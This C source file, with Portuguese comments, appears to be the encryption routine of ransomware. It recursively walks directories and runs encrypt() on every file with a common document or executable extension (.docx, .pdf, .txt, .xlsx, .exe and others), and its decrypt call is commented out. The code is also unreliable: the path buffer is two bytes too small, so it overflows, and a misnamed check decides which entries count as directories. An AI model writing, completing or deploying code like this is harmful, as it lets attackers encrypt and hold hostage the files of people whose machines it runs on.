#include "dir.h"
#include "cript.h"

bool interested_ext(char * file_name){
    if (strstr(file_name, ".exe")) return true;
    if (strstr(file_name, ".docx")) return true;
    if (strstr(file_name, ".doc")) return true;
    if (strstr(file_name, ".txt")) return true;
    if (strstr(file_name, ".pdf")) return true;
    if (strstr(file_name, "xlsx")) return true;
    if (strstr(file_name, ".rtf")) return true;
    if (strstr(file_name, ".word")) return true;
    if (strstr(file_name, ".csv")) return true;

    return false;
}

bool is_file(char lsdir_name[]){
    for(int i = 0; lsdir_name[i] != '\0'; i++){
        if (lsdir_name[i] == '.') return false;
    }

    return true;
}

void read_and_encrpyt_dirs(char dir_name[], int n_spaces, bool show_dirs){
    if (show_dirs){
        for(int i = 0; i < n_spaces; i++) printf(" ");
            printf("ACTUAL DIR: %s\n", dir_name);
    }

    DIR * dir;
    struct dirent * lsdir;

    dir = opendir(dir_name);

    while((lsdir = readdir(dir)) != NULL){
        //Para mostrar os nomes de arquivos e pastas
        if (show_dirs){
            for(int i = 0; i < n_spaces; i++) printf(" ");
                printf("%s\n\n", lsdir->d_name);
        }

        char new_dir[strlen(dir_name)+strlen(lsdir->d_name)-1];
        new_dir[0] = '\0';
        strcat(new_dir, dir_name);
        strcat(new_dir, "\\");
        strcat(new_dir, lsdir->d_name);

        if (is_file(lsdir->d_name)){ //chama a função recursivamente para uma nova pasta
            read_and_encrpyt_dirs(new_dir, n_spaces + 6, show_dirs);
        }else if (interested_ext(lsdir->d_name)){ //criptografa os arquivos com extensão interessados
            encrypt(new_dir, 374);
            //decrypt(new_dir,374);

        }
    }
    closedir(dir);
}
